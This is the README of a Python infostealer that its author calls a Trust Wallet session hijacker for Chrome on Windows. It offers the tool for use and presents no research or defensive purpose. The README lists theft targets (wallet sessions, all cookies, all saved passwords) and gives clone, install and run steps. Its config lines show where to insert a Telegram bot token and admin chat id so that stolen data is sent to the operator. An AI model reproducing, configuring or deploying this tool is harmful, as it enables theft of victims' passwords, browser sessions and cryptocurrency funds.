# windows chrome hijacker

python script for make trust wallet session hijacker in chrome (win) and hijack all cookies and saved passwords in browser

## targets

<div align="center">

| **browser**  | **target data**  |
|:--------:|:-----------:|
| **chrome (win)** | ✔️ trust wallet session   |
| **chrome (win)** | ✔️ all sites cookies   |
| **chrome (win)** | ✔️ all saved passwords   |

</div>

## Prerequisites

- Python 3
- windows system for run bot

## Installation

1. **Clone the Repository**
   ```sh
   git clone https://github.com/fploit/TrustWallet_Session_Hijacker
   cd TrustWallet_Session_Hijacker
   ```

2. ** Install python librarys **
   ```sh
   pip install -r requirements.txt
   ```

## Edit Files

1. ** Edit bot.py (add telegram bot token and admin chat id**
   ```python
   bot = telebot.TeleBot("TELEGRAM_BOT_TOKEN", parse_mode="html")   # <------- edit this line
   admin = -1001797987215 #admin chat id                            # <------- edit this line
   ```

2. ** Edit hijacker.py (add telegram bot token and admin chat id**
   ```python
   tel_bot = telebot.TeleBot(token="TELEGRAM_BOT_TOKEN")            # <------- edit this line
   chat_id = CHATX_IDX_X
   admin = -1001797987215 # admin chat id for all users data log    # <------- edit this line
   ```


## run bot in windows server or ...

- run
  ```sh
  python3 bot.py
  ```
